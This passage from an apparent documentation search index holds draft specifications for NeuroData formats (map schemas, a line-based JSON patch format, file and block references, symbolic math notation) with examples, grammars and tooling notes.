It prioritizes simplicity and readability, borrowing syntax conventions from other NeuroData formats like <code>.ndform</code> and <code>.ndtable</code>.</p>"},{"location":"NeuroData/map_schema/#2-example","title":"2. Example","text":"<pre><code># File: docs/NeuroData/schemas/metadata_schema.ndmap_schema\n\n:: type: NSMapSchema\n:: version: 0.1.0\n:: id: basic-metadata-schema\n:: description: Defines common metadata keys using named enums.\n:: depth: 1 # Default depth limit for values\n\n# --- Enum Definitions ---\n\nDEFINE ENUM LifecycleStatus\n  VALUE \"draft\"\n    DESC \"Initial, non-final version.\"\n  VALUE \"review\"\n    DESC \"Ready for review.\"\n  VALUE \"approved\"\n    DESC \"Finalized and approved.\"\n  VALUE \"deprecated\"\n    DESC \"No longer recommended.\"\n\nDEFINE ENUM ContentType\n  VALUE \"NSproject\"\n    DESC \"General project file.\"\n  VALUE \"NeuroScript\"\n    DESC \"Executable NeuroScript code.\"\n  # ... other types ...\n\n# --- Key Definitions ---\n\nKEY \"version\" # Keys are strings\n  DESC \"Semantic version.\"\n  TYPE string\n  REQUIRED true\n\nKEY \"type\"\n  DESC \"Primary type of the file/block content.\"\n  TYPE enum(ContentType) # Reference the defined enum\n  REQUIRED true\n\nKEY \"status\"\n  DESC \"Lifecycle status.\"\n  TYPE enum(LifecycleStatus) # Reference the defined enum\n  REQUIRED false\n\nKEY \"author_details\"\n  DESC \"Information about the author.\"\n  TYPE [ref:author-schema] # Reference another schema for nested structure\n  REQUIRED false\n  # DEPTH constraint could be defined in author-schema instead\n</code></pre> <pre><code># Example data instance conforming to the schema above\n{\n  \"version\": \"1.2.3\",\n  \"type\": \"NeuroScript\",\n  \"status\": \"approved\",\n  \"author_details\": { \"name\": \"A. Turing\", \"email\": \"alan@example.com\" } # Assumes author-schema defines name &amp; email\n}\n</code></pre>"},{"location":"NeuroData/map_schema/#3-syntax","title":"3. Syntax","text":"<p>An <code>.ndmap_schema</code> file consists of the following sections: 1.  File-Level Metadata: Optional <code>:: key: value</code> lines [metadata.md]. Recommended metadata includes <code>:: type: NSMapSchema</code>, <code>:: version: &lt;semver&gt;</code>, <code>:: id: &lt;schema_id&gt;</code>, and optionally <code>:: depth: &lt;number&gt;</code> to limit overall nesting. 2.  Enum Definitions (Optional): Zero or more <code>DEFINE ENUM</code> blocks, each defining a named, reusable list of allowed values and their descriptions. 3.  Key Definitions: One or more <code>KEY</code> definitions describing the expected keys in the map literal data and the constraints on their associated values. 4.  Comments/Blank Lines: Allowed between metadata and definitions, and between definitions (<code>#</code> or <code>--</code>).</p>"},{"location":"NeuroData/map_schema/#31-file-level-metadata","title":"3.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [metadata.md]. Recommended: * <code>:: type: NSMapSchema</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_schema_id&gt;</code> (Required if referenced) * <code>:: description: &lt;text&gt;</code> (Optional) * <code>:: depth: &lt;number&gt;</code> (Optional) - If present, suggests a maximum nesting depth for the entire map structure defined by this schema. Validation tools may use this.</p>"},{"location":"NeuroData/map_schema/#32-enum-definition-define-enum","title":"3.2 Enum Definition (<code>DEFINE ENUM</code>)","text":"<ul> <li>Format:   <pre><code>DEFINE ENUM &lt;enum_name&gt;\n  VALUE \"&lt;enum_value_1&gt;\"\n    DESC \"&lt;Description of enum_value_1&gt;\"\n  VALUE \"&lt;enum_value_2&gt;\"\n    DESC \"&lt;Description of enum_value_2&gt;\"\n  # ... more VALUE/DESC pairs\n</code></pre></li> <li><code>DEFINE ENUM &lt;enum_name&gt;</code>: Starts the definition. <code>&lt;enum_name&gt;</code> must be a unique identifier within the schema file (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>).</li> <li><code>VALUE \"&lt;enum_value_string&gt;\"</code>: (Indented) Defines an allowed literal value for the enum (typically a string).</li> <li><code>DESC \"&lt;description&gt;\"</code>: (Indented further) Provides the human-readable description for the preceding <code>VALUE</code>. This is crucial for understanding the enum's meaning.</li> </ul>"},{"location":"NeuroData/map_schema/#33-key-definition-key","title":"3.3 Key Definition (<code>KEY</code>)","text":"<ul> <li>Format:   <pre><code>KEY \"&lt;key_name_string&gt;\"\n  # Indented attribute lines\n  DESC \"&lt;description&gt;\"\n  TYPE &lt;type_spec&gt;\n  REQUIRED &lt;true|false&gt;\n  DEPTH &lt;number&gt; # Optional depth limit for this key's value\n</code></pre></li> <li><code>KEY \"&lt;key_name_string&gt;\"</code>: Starts the definition. <code>&lt;key_name_string&gt;</code> is the literal string key expected in the map data instance.</li> <li>Attribute Lines (Indented): Define properties and constraints for the value associated with this key.<ul> <li><code>DESC \"&lt;description&gt;\"</code>: (Recommended) Human-readable description of the key's purpose.</li> <li><code>TYPE &lt;type_spec&gt;</code>: (Required) Specifies the expected data type or enum reference for the value. Supported types:<ul> <li>Base types: <code>string</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>list</code>, <code>map</code>, <code>any</code>.</li> <li>Enum reference: <code>enum(&lt;enum_name&gt;)</code> - References a named enum defined elsewhere in the file using <code>DEFINE ENUM &lt;enum_name&gt;</code>. The value must match one of the <code>VALUE</code>s defined in that enum.</li> <li>Schema reference: <code>[ref:&lt;schema_id&gt;]</code> or <code>[ref:path/to/schema.ndmap_schema]</code> - Indicates the value should be a map conforming to another <code>.ndmap_schema</code> schema (used for defining nested structures).</li> </ul> </li> <li><code>REQUIRED &lt;true|false&gt;</code>: (Optional) Specifies if the key must be present in the map data instance. Defaults to <code>false</code>.</li> <li><code>DEPTH &lt;number&gt;</code>: (Optional) Specifies the maximum nesting depth allowed specifically for the value of this key (relevant if <code>TYPE</code> is <code>list</code>, <code>map</code>, <code>any</code>, or references another schema). Overrides file-level <code>:: depth</code> for this key.</li> </ul> </li> </ul>"},{"location":"NeuroData/map_schema/#4-tooling-interaction","title":"4. Tooling Interaction","text":"<p>Tools interacting with <code>ns-map-literal</code> data and <code>.ndmap_schema</code> schemas should: 1.  Parse the <code>.ndmap_schema</code> schema file to understand the expected structure, types, required keys, and enum definitions. 2.  Parse the <code>ns-map-literal</code> data block using the NeuroScript expression parser. 3.  Validation: Compare the parsed map literal data against the parsed schema:     * Check for missing required keys.     * Check if all present keys are defined in the schema (optional strict mode).     * Validate the data type of each value against the <code>TYPE</code> specified in the schema.     * If <code>TYPE</code> is <code>enum(&lt;name&gt;)</code>, verify the value exists in the named <code>DEFINE ENUM</code> block.     * If <code>TYPE</code> is <code>[ref:...]</code>, recursively validate the nested map value against the referenced schema.     * Enforce <code>DEPTH</code> constraints if specified. 4.  Documentation/UI: Use the <code>DESC</code> attributes from the schema (for both keys and enum values) to provide context to users or generate documentation.</p>"},{"location":"NeuroData/patch/","title":"Patch","text":"<p>:: type: NeuroData :: subtype: spec :: version: 0.1.0 :: id: ndpatch-json-spec-0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/specification_structure.md :: howToUpdate: Review format based on usage by patching tools or AI. Update version for non-trivial changes.</p>"},{"location":"NeuroData/patch/#neuroscript-json-patch-format-specification-ndpatchjson","title":"NeuroScript JSON Patch Format Specification (<code>ndpatch.json</code>)","text":""},{"location":"NeuroData/patch/#1-purpose","title":"1. Purpose","text":"<p>This specification defines the <code>ndpatch.json</code> format, a JSON-based structure for representing individual file modification operations (replacements, insertions, deletions) using line numbers. It is intended as an alternative to standard diff/patch formats, particularly where robustness against intermediate formatting changes (e.g., in UI transfers) is desired, while still allowing for precise, location-based changes. Each object in the top-level array represents a single operation on a specific file. The recommended file extension is <code>.ndpatch.json</code>.</p>"},{"location":"NeuroData/patch/#2-example","title":"2. Example","text":"<p>This example shows three separate operations: a replace, an insert, and a delete, potentially targeting the same file but represented as individual objects in the array.</p> <pre><code>[\n  {\n    \"file\": \"path/to/your/file.txt\",\n    \"line\": 8,\n    \"op\": \"replace\",\n    \"old\": \"This is the original line 8 content.\",\n    \"new\": \"This is the new content replacing line 8.\"\n  },\n  {\n    \"file\": \"path/to/your/file.txt\",\n    \"line\": 5,\n    \"op\": \"insert\",\n    \"new\": \"This new line will be inserted before the original line 5.\"\n  },\n  {\n    \"file\": \"path/to/your/file.txt\",\n    \"line\": 10,\n    \"op\": \"delete\",\n    \"old\": \"This original line 10 content will be deleted.\"\n  }\n]\n</code></pre>"},{"location":"NeuroData/patch/#3-design-choices-rationale-optional","title":"3. Design Choices / Rationale (Optional)","text":"<ul> <li>JSON Structure: Chosen for its widespread support and robustness in representing string content.</li> <li>Array of Operations: Each object represents a single change, simplifying generation but requiring the applying tool to handle operations sequentially and manage state (like line number shifts) across operations targeting the same file.</li> <li>Line Numbers: Included for precise location of changes. Using 1-based indexing is conventional.</li> <li><code>old</code> field for Verification: Provides an optional safety check for <code>replace</code> and <code>delete</code>.</li> <li>Alternative to Standard Patch: Addresses potential corruption issues of standard diff formats during transfer.</li> <li>Tool Incompatibility: Acknowledged trade-off is incompatibility with standard <code>patch</code> and <code>git apply</code> tools. Requires custom application logic.</li> </ul>"},{"location":"NeuroData/patch/#4-syntax-format-definition","title":"4. Syntax / Format Definition","text":"<p>The format consists of a single top-level JSON array <code>[...]</code>. Each element within the array is an \"Operation Object\" representing a single modification to a file.</p>"},{"location":"NeuroData/patch/#41-operation-object-structure","title":"4.1 Operation Object Structure","text":"<p>Each object within the top-level array represents a single modification and has the following keys:</p> <ul> <li><code>file</code>: (String, Required)<ul> <li>The relative path to the target file that needs modification. Path should be relative to a common root (e.g., project root).</li> </ul> </li> <li><code>line</code>: (Integer, Required)<ul> <li>The 1-based line number in the target file where the operation should occur, relative to the state of the file before this specific operation is applied within the overall sequence of operations in the array.</li> <li>For <code>replace</code>: The line number to be replaced.</li> <li>For <code>insert</code>: The line number before which the <code>new</code> content should be inserted. The inserted content will become the new line at this number.</li> <li>For <code>delete</code>: The line number to be deleted.</li> </ul> </li> <li><code>op</code>: (String, Required)<ul> <li>Specifies the type of modification. Must be one of: <code>\"replace\"</code>, <code>\"insert\"</code>, <code>\"delete\"</code>.</li> </ul> </li> <li><code>old</code>: (String, Optional but Recommended for <code>replace</code>/<code>delete</code>)<ul> <li>The expected original content of the line identified by <code>line</code>. Used by applying tools for verification before modifying the file. Should be omitted or null for <code>insert</code>. Example name in test data: <code>\"original_line_for_reference\"</code>.</li> </ul> </li> <li><code>new</code>: (String, Required for <code>replace</code>/<code>insert</code>)<ul> <li>Contains the full text, including any leading/trailing whitespace and line ending characters (typically <code>\\n</code>), for the line that should replace the existing line (<code>replace</code>) or be inserted (<code>insert</code>). Should be omitted or null for <code>delete</code>. Example name in test data: <code>\"new_line_content\"</code>.</li> </ul> </li> </ul>"},{"location":"NeuroData/patch/#5-ebnf-grammar-optional","title":"5. EBNF Grammar (Optional)","text":"<p>Not applicable. The structure is defined by JSON syntax.</p>"},{"location":"NeuroData/patch/#6-ai-reading","title":"6. AI Reading","text":"<ul> <li>Understand this format describes a sequence of individual changes to files using line numbers.</li> <li>Each object in the top-level array is a self-contained operation specifying the <code>file</code>, <code>line</code>, <code>op</code>, optional <code>old</code> content, and required <code>new</code> content (for replace/insert).</li> <li>Recognize that operations should be applied sequentially as they appear in the array.</li> <li>Crucially, understand that line numbers (<code>line</code>) refer to the file state before the specific operation is applied. When multiple operations target the same file, the applying tool must track line number shifts.</li> </ul>"},{"location":"NeuroData/patch/#7-ai-writing","title":"7. AI Writing","text":"<ul> <li>When generating patches in this format:<ul> <li>Ensure the top-level structure is a JSON array <code>[...]</code>.</li> <li>Each element in the array must be an object representing a single operation.</li> <li>Each operation object must have <code>file</code> (string), <code>line</code> (integer &gt;= 1), and <code>operation</code> (string: \"replace\", \"insert\", or \"delete\").</li> <li>For <code>replace</code>, include <code>old</code> (string, recommended) and <code>new</code> (string).</li> <li>For <code>insert</code>, include <code>new</code> (string) and omit <code>old</code>.</li> <li>For <code>delete</code>, include <code>old</code> (string, recommended) and omit <code>new</code>.</li> <li>Verify <code>old</code> content matches the target line when providing it.</li> <li>Ensure <code>new</code> content is the complete desired line.</li> <li>Calculate line numbers based on the original file state relative to where the change needs to happen, considering the logical sequence of operations already added to the patch array.</li> </ul> </li> </ul>"},{"location":"NeuroData/patch/#8-tooling-requirements-interaction-optional","title":"8. Tooling Requirements / Interaction (Optional)","text":"<ul> <li>Incompatibility: Standard tools like <code>patch</code> or <code>git apply</code> cannot parse or apply this format.</li> <li>Parsing: Requires a standard JSON parser.</li> <li>Application Logic: Custom tooling (e.g., <code>nspatch.go</code> [cite: uploaded:neuroscript_small/pkg/nspatch/nspatch.go]) is required. The tool must:<ul> <li>Process the operation objects in the top-level array strictly sequentially.</li> <li>For each operation:<ul> <li>Identify the target <code>file</code>.</li> <li>Read the file content if not already in memory for that file (or maintain the modified state in memory if multiple operations target the same file).</li> <li>Maintain an internal <code>line_offset</code> counter per file, initialized to 0 when the file is first encountered. This offset tracks how insertions (+) or deletions (-) have shifted subsequent line numbers relative to the original file.</li> <li>Calculate the <code>adjusted_line_number = operation.line + line_offset</code>. This is the actual index (0-based) in the current state of the line list being modified for that specific file.</li> <li>Verification (Optional but Recommended): If <code>old</code> is provided for <code>replace</code> or <code>delete</code>, check if the content at <code>adjusted_line_number</code> matches <code>old</code>. If not, report an error and potentially skip the operation or halt processing.</li> <li>Perform Operation:<ul> <li><code>replace</code>: Modify the line at <code>adjusted_line_number</code> with <code>new</code>. (No change to <code>line_offset</code>).</li> <li><code>insert</code>: Insert <code>new</code> content before the line at <code>adjusted_line_number</code>. Increment the <code>line_offset</code> for that file by 1.</li> <li><code>delete</code>: Remove the line at <code>adjusted_line_number</code>. Decrement the <code>line_offset</code> for that file by 1.</li> </ul> </li> <li>Error Handling: Handle cases where <code>adjusted_line_number</code> is out of bounds for the current state of the file's line list.</li> </ul> </li> <li>After processing all operations, write the final modified content back to all affected files.</li> </ul> </li> <li>Whitespace/Line Endings: Preservation relies on <code>old</code>/<code>new</code> strings being correctly represented in JSON and handled correctly by the applying tool. Assume <code>\\n</code> line endings unless specified otherwise.</li> </ul>"},{"location":"NeuroData/references/","title":"NeuroScript References Specification","text":"<p>:: type: Specification :: version: 0.1.2 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md, pkg/core/security.go, pkg/neurodata/blocks/blocks_extractor.go :: howToUpdate: Ensure syntax definitions for both file and block refs are clear, examples are accurate, path restrictions are explicit.</p>"},{"location":"NeuroData/references/#1-purpose","title":"1. Purpose","text":"<p>This document defines a standard, consistent syntax for referencing specific resources within a NeuroScript project. This includes referencing entire files or specific fenced code/data blocks within those files. This allows for reliable linking between documentation, metadata, scripts, and data, promoting portability and maintainability.</p>"},{"location":"NeuroData/references/#2-syntax","title":"2. Syntax","text":"<p>The standard format for a reference is enclosed in square brackets and begins with <code>ref:</code>:</p> <ol> <li>File Reference: <code>[ref:&lt;location&gt;]</code></li> <li>Block Reference: <code>[ref:&lt;location&gt;#&lt;block_id&gt;]</code></li> </ol> <p>Components: * <code>[</code> and <code>]</code>: Square brackets enclose the entire reference. * <code>ref:</code>: A mandatory literal prefix indicating that this is a NeuroScript reference, distinguishing it from other uses of square brackets (like properties or list literals). * <code>&lt;location&gt;</code>: Specifies the file containing the target resource. This MUST be one of the following:     * <code>this</code>: A special keyword referring to the current file where the reference itself resides.     * A relative file path (e.g., <code>../data/users.ndtable</code>, <code>sibling_script.ns.txt</code>). Paths MUST use forward slashes (<code>/</code>) as separators. Relative paths are strongly recommended for portability. Absolute paths are disallowed in this syntax. Path validation using security routines (like <code>SecureFilePath</code> [cite: uploaded:neuroscript/pkg/core/security.go]) should still be performed by tools resolving these references based on their context (e.g., current working directory or sandbox root). * <code>#&lt;block_id&gt;</code> (Optional): If present, this part indicates a reference to a specific block within the file.     * <code>#</code>: A mandatory separator character when referencing a block. Its absence indicates a reference to the entire file.     * <code>&lt;block_id&gt;</code>: The unique identifier of the target block within its file. This identifier MUST correspond to the value defined in the block's <code>:: id:</code> metadata tag [cite: uploaded:neuroscript/docs/metadata.md]. Block IDs should be unique within their containing file. Tools resolving block references will rely on the <code>:: id:</code> metadata found by block extraction mechanisms [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_extractor.go].</p>"},{"location":"NeuroData/references/#3-nesting","title":"3. Nesting","text":"<p>This specification currently only defines references to top-level blocks within a file. A syntax or convention for referencing blocks nested within other blocks is not defined at this time and may require extensions to block extraction tools. File references (<code>[ref:&lt;location&gt;]</code>) naturally do not involve nesting.</p>"},{"location":"NeuroData/references/#4-tooling","title":"4. Tooling","text":"<p>Tools interacting with NeuroScript files and NeuroData formats need to be able to parse this reference syntax and resolve it appropriately based on the presence or absence of the <code>#&lt;block_id&gt;</code> component. * References without <code>#&lt;block_id&gt;</code> (e.g., <code>[ref:config.yaml]</code>) typically imply reading or identifying the entire file content. Tools like <code>TOOL.ReadFile</code> might implicitly accept this format, or a dedicated <code>TOOL.ResolveReference</code> could be used. * References with <code>#&lt;block_id&gt;</code> (e.g., <code>[ref:this#setup]</code>) require tools to read the file, extract blocks (using logic similar to <code>TOOL.BlocksExtractAll</code> [cite: uploaded:neuroscript/pkg/neurodata/blocks/blocks_tool.go]), and find the specific block by its <code>:: id:</code>. * A potential future tool, <code>TOOL.GetBlockFromString(content_string, block_id)</code>, could extract a block by ID directly from string content held in a variable. * Path validation using security routines [cite: uploaded:neuroscript/pkg/core/security.go] must always be applied when the <code>&lt;location&gt;</code> refers to a file path.</p>"},{"location":"NeuroData/references/#5-usage-examples","title":"5. Usage Examples","text":"<p>References can be used in various contexts:</p> <ul> <li>Metadata: <pre><code>:: dependsOn: [ref:this#section-2], [ref:../schemas/user.ndtable], [ref:../schemas/common.ns.txt#validation-rules]\n:: template: [ref:templates/base.md]\n</code></pre></li> <li>NeuroScript Code: <pre><code>SET config_content = CALL TOOL.ReadFile(\"[ref:config.yaml]\")\nSET template_code = CALL TOOL.GetBlockFromFile(\"[ref:this#template-code]\") # Hypothetical tool\nCALL TOOL.ApplySchema(\"[ref:schemas/data_schema.json]\", input_data)\n</code></pre></li> <li>Documentation (Markdown Links): <pre><code>See the [API Specification](ref:../api/spec_v1.md) or the specific [User Endpoint details](ref:../api/spec_v1.md#user-endpoint).\n(Alternative: Source file is [ref:main.go], main logic is [ref:this#main-logic])\n</code></pre></li> <li>NeuroData Files: <pre><code>NODE ScriptRunner [script: \"[ref:../scripts/run.ns.txt#main-proc]\"]\nNODE DataLoader [source_file: \"[ref:data/input.csv]\"]\n</code></pre></li> </ul>"},{"location":"NeuroData/references/#6-examples-of-reference-strings","title":"6. Examples of Reference Strings","text":"<ul> <li>File References:<ul> <li><code>[ref:this]</code> - References the current file.</li> <li><code>[ref:config/production.yaml]</code> - References the file <code>production.yaml</code> in the <code>config</code> subdirectory.</li> <li><code>[ref:../LICENSE]</code> - References the <code>LICENSE</code> file in the parent directory.</li> </ul> </li> <li>Block References:<ul> <li><code>[ref:this#data-validation-rules]</code> - References block <code>:: id: data-validation-rules</code> in the current file.</li> <li><code>[ref:schemas/user.ndtable#unique-email-rule]</code> - References block <code>:: id: unique-email-rule</code> in the specified table file.</li> <li><code>[ref:../docs/api.md#get-user-example]</code> - References block <code>:: id: get-user-example</code> in a relative documentation file.</li> </ul> </li> </ul>"},{"location":"NeuroData/rendering_grammar/","title":"Rendering Grammar","text":"<p>A way to communicate how to do syntax highlighting etc. for the format in question </p>"},{"location":"NeuroData/symbolic_math/","title":"Symbolic Math","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.3 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata_and_composite_file_spec.md, docs/NeuroData/map_literal.md, docs/NeuroData/map_schema.md :: howToUpdate: Refine function naming conventions, EBNF, specify supported functions/operators, detail tool behaviors and CAS integration strategy. Update attached block example if map_literal or map_schema specs change.</p>"},{"location":"NeuroData/symbolic_math/#neurodata-symbolic-math-format-ndmath-specification","title":"NeuroData Symbolic Math Format (.ndmath) Specification","text":""},{"location":"NeuroData/symbolic_math/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Symbolic Math (<code>.ndmath</code>) provides a format for representing mathematical expressions in a structured, unambiguous way suitable for symbolic manipulation by computer algebra systems (CAS) integrated via NeuroScript tools. It prioritizes structural clarity for machine processing over visual similarity to traditional mathematical notation.</p>"},{"location":"NeuroData/symbolic_math/#2-example-ndmath-with-attached-definitions-and-schema-reference","title":"2. Example <code>.ndmath</code> with Attached Definitions and Schema Reference","text":"<p><pre><code>:: type: SymbolicMath\n:: version: 0.1.2 # Version of this specific ndmath block content\n:: notation: Functional\n:: id: gr-field-eq-annotated\n:: description: Conceptual GR Field Equations with term descriptions.\n\n# The schema for the ns-map-literal block below is defined in Section 5.2\n\n```funcmath\nEquals(\n  Add(\n    Subtract(\n      RicciTensor(mu, nu),\n      Multiply(\n        Divide(1, 2),\n        ScalarCurvature(),\n        MetricTensor(mu, nu)\n      )\n    ),\n    Multiply(\n      Lambda(),\n      MetricTensor(mu, nu)\n    )\n  ),\n  Multiply(\n    Divide(\n      Multiply(8, Pi(), G()), # Constants as functions\n      Power(c(), 4)\n    ),\n    StressEnergyTensor(mu, nu)\n  )\n)\n</code></pre> <pre><code># Attached block defining terms used in the expression above.\n# It conforms to the schema defined in Section 5.2\n:: type: MapLiteralData\n:: version: 1.0.0\n:: schema: [ref:this#math-term-def-schema] # Reference the schema block defined in Sec 5.2\n{\n  \"RicciTensor\": {\n    \"description\": \"Tensor representing curvature derived from the Riemann tensor.\",\n    \"reference\": \"https://en.wikipedia.org/wiki/Ricci_curvature\"\n  },\n  \"MetricTensor\": {\n    \"description\": \"Fundamental tensor defining spacetime geometry (g_\u00b5\u03bd).\",\n    \"reference\": \"[ref:./tensors.md#metric]\" # Link to another project file/block\n  },\n  \"Lambda\": {\n    \"description\": \"Cosmological Constant.\"\n    # No reference needed/provided here, which is allowed by the schema\n  },\n  \"mu\": {\n    \"description\": \"Spacetime index (typically 0-3)\",\n    \"reference\": \"[ref:./glossary.md#indices]\"\n  },\n  \"StressEnergyTensor\": {\n    \"description\": \"Tensor describing density/flux of energy/momentum (T_\u00b5\u03bd).\"\n    # Missing reference (optional)\n  }\n  # ... definitions for nu, ScalarCurvature, Pi, G, c, Equals, Add, etc.\n}\n</code></pre> <pre><code>## 3. Design Choices\n\n* **Functional Notation:** Chosen over S-expressions for improved readability for users familiar with programming language function calls. Chosen over presentational formats (like LaTeX or MathML Presentation) because the primary goal is representing the mathematical structure for computation, not visual layout. Chosen over semantic formats like Content MathML for relative simplicity in syntax and parsing, assuming a dedicated NeuroScript parser.\n* **Pure Functional Form:** Operators (like `+`, `*`, `^`) are represented as functions (`Add`, `Multiply`, `Power`) to ensure an unambiguous tree structure suitable for parsing.\n* **Term Definitions:** Descriptions, links, or other metadata about symbols or functions used within the expression can be provided in an attached `ns-map-literal` block [[map_literal.md](./NeuroData/map_literal.md)], conforming to the schema defined in Section 5.2.\n* **Tool-Centric:** The format relies heavily on NeuroScript tools (`TOOL.Math*`) to perform actual symbolic manipulation (simplification, differentiation, etc.) and conversion to/from other formats (LaTeX, S-expressions, Infix). These tools would typically wrap external CAS libraries.\n\n## 4. Syntax (`.ndmath`)\n\nAn `.ndmath` file or block consists of:\n1.  **File-Level Metadata:** Optional `:: key: value` lines [[metadata.md](./metadata.md)].\n2.  **Optional Term Definition Schema Block:** An optional fenced block tagged `ndmap_schema` defining the structure for term definitions. See Section 5.2.\n3.  **Expression Block:** A single fenced block containing the mathematical expression represented in Functional Notation. Tag should be `funcmath` or similar. See Section 5.3.\n4.  **Optional Attached Term Definitions Block:** An optional fenced block tagged `ns-map-literal` containing definitions for terms used in the expression block, conforming to the defined schema. See Section 5.4.\n\n### 4.1 File-Level Metadata\n\nStandard `:: key: value` lines. Recommended metadata includes:\n* `:: type: SymbolicMath` (Required)\n* `:: version: &lt;semver&gt;` (Required, version of the .ndmath content itself)\n* `:: notation: Functional` (Required)\n* `:: id: &lt;unique_expr_id&gt;` (Optional if referenced)\n* `:: description: &lt;text&gt;` (Optional)\n\n## 5. Detailed Syntax Components\n\n### 5.1 Overview\n(Section added to group detailed syntax elements previously under top-level Syntax)\n\n### 5.2 Term Definition Schema Block (`ndmap_schema`)\n\n* An optional block defining the structure of the term definitions map. Its syntax follows the `.ndmap_schema` format [[map_schema.md](./NeuroData/map_schema.md)].\n* It's recommended to include this if using an attached term definitions block (Section 5.4).\n* **Example Schema Definition:**\n```ndmap_schema\n# Embedded schema defining the structure for the value associated with each term key\n# in the attached ns-map-literal block (e.g., the value for \"RicciTensor\", \"mu\").\n\n:: type: NSMapSchema\n:: version: 0.1.0\n:: id: math-term-def-schema # ID for referencing within this file\n:: description: Defines the structure expected for the definition map of a single term (symbol or function) used in .ndmath expressions.\n\nKEY \"description\" # Key name must be literal string in schema\n  DESC \"A human-readable explanation of the term.\"\n  TYPE string\n  REQUIRED true # Description is required for clarity\n\nKEY \"reference\"\n  DESC \"A URL or [ref:...] link to more detailed documentation or definition.\"\n  TYPE string   # Type is string; content validation (URL/ref format) is separate\n  REQUIRED false # Reference is optional\n</code></pre></p>"},{"location":"NeuroData/symbolic_math/#53-expression-block-functional-notation","title":"5.3 Expression Block (Functional Notation)","text":"<ul> <li>The main mathematical expression is stored within a fenced block, typically with language tag <code>funcmath</code>.</li> <li>Syntax: Expressions are represented using a prefix functional notation: <code>FunctionName(arg1, arg2, ...)</code><ul> <li><code>FunctionName</code>: Represents a mathematical function (e.g., <code>Sin</code>, <code>Log</code>), operator (e.g., <code>Add</code>), or structural element (e.g., <code>Equals</code>, <code>Integrate</code>).</li> <li><code>arg1, arg2, ...</code>: Arguments (Literals, Symbols, Nested Calls).</li> </ul> </li> <li>Mapping Examples:<ul> <li><code>x + y</code> -&gt; <code>Add(x, y)</code></li> <li><code>2 * x</code> -&gt; <code>Multiply(2, x)</code></li> <li><code>x^2</code> -&gt; <code>Power(x, 2)</code></li> <li><code>sin(x)</code> -&gt; <code>Sin(x)</code></li> <li><code>df/dx</code> -&gt; <code>Differentiate(f, x)</code></li> <li><code>integrate(f(x), x)</code> -&gt; <code>Integrate(f(x), x)</code> (Indefinite)</li> <li><code>integrate(f(x), x, 0, 1)</code> -&gt; <code>Integrate(f(x), List(x, 0, 1))</code> (Definite)</li> </ul> </li> </ul>"},{"location":"NeuroData/symbolic_math/#54-attached-term-definitions-block-ns-map-literal","title":"5.4 Attached Term Definitions Block (<code>ns-map-literal</code>)","text":"<ul> <li>Optionally, immediately following the <code>funcmath</code> block, an attached block tagged <code>ns-map-literal</code> can be used.</li> <li>The content must be a single, valid NeuroScript map literal [script spec.md], conforming to the schema defined (usually in Section 5.2 or referenced via <code>:: schema:</code> metadata within this block, see [map_literal.md])</li> <li>Keys are term names (strings), values are maps usually containing <code>description</code> (string, required by schema in Sec 5.2) and <code>reference</code> (string, optional).</li> <li>Tools should parse this block using a NeuroScript parser and link definitions to terms in the main expression.</li> <li>See the example in Section 2.</li> </ul>"},{"location":"NeuroData/symbolic_math/#6-ebnf-grammar-draft-needs-update-for-attached-blocks-schema","title":"6. EBNF Grammar (Draft - Needs Update for Attached Blocks &amp; Schema)","text":"<p><pre><code>math_file          ::= { metadata_line | comment_line | blank_line }\n                      [ term_definition_schema_block ]\n                      expression_block\n                      [ term_definition_data_block ] ;\n\nmetadata_line      ::= optional_whitespace \"::\" whitespace key \":\" value newline ;\n\nterm_definition_schema_block ::= optional_whitespace \"```\" \"ndmap_schema\" newline map_schema_content optional_whitespace \"```\" newline ;\nexpression_block   ::= optional_whitespace \"```\" language_tag? newline functional_expression optional_whitespace \"```\" newline ;\nterm_definition_data_block ::= optional_whitespace \"```\" \"ns-map-literal\" newline map_literal_content optional_whitespace \"```\" newline ;\n\nfunctional_expression ::= function_call | symbol | literal ;\n\nfunction_call     ::= identifier \"(\" [ argument_list ] \")\" ;\nargument_list     ::= functional_expression { \",\" functional_expression } ;\n\nsymbol            ::= identifier ;\nliteral           ::= number_literal | string_literal | boolean_literal ;\n\nmap_schema_content ::= (* Content parsed according to .ndmap_schema syntax *) ;\nmap_literal_content ::= (* Content parsed according to NeuroScript map literal syntax *) ;\n\nidentifier        ::= letter { letter | digit | \"_\" } ;\n\n(* Define other terms *)\n</code></pre> (Note: This EBNF needs significant refinement.)</p>"},{"location":"NeuroData/symbolic_math/#7-tooling-requirements","title":"7. Tooling Requirements","text":"<p>Effective use requires CAS-wrapping tools plus parsing capabilities for <code>.ndmap_schema</code> and <code>ns-map-literal</code>.</p> <ul> <li>Core Manipulation Tools: (Remain the same) <code>TOOL.MathSimplify</code>, <code>TOOL.MathExpand</code>, etc.</li> <li>Conversion Tools: (Remain the same) <code>TOOL.MathToLatex</code>, etc.</li> <li>Parsing Requirement: Tools interacting with <code>.ndmath</code> must be capable of:<ul> <li>Optionally parsing an <code>ndmap_schema</code> block (Section 5.2).</li> <li>Parsing the primary <code>funcmath</code> block (Section 5.3).</li> <li>Optionally detecting and parsing a subsequent <code>ns-map-literal</code> block (Section 5.4) using the NeuroScript expression parser.</li> <li>Optionally validating the parsed map literal against the parsed schema (using the schema block's ID if referenced with <code>this#</code>).</li> <li>Optionally using the extracted term definitions for validation, display, or further processing.</li> </ul> </li> </ul>"},{"location":"NeuroData/table/","title":"NeuroData Table Format (.ndtable) Specification","text":"<p>:: type: TableFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md, docs/script spec.md, docs/ns/tools/query_table :: howToUpdate: Review schema definitions, validation rules, data format, EBNF, and examples. Update planned features (NS fragments). See also query spec (docs/ns/tools/query_table)</p>"},{"location":"NeuroData/table/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Tables (<code>.ndtable</code>) provide a simple, human-readable plain-text format for representing tabular data, similar to simple SQL tables or CSV files but with an 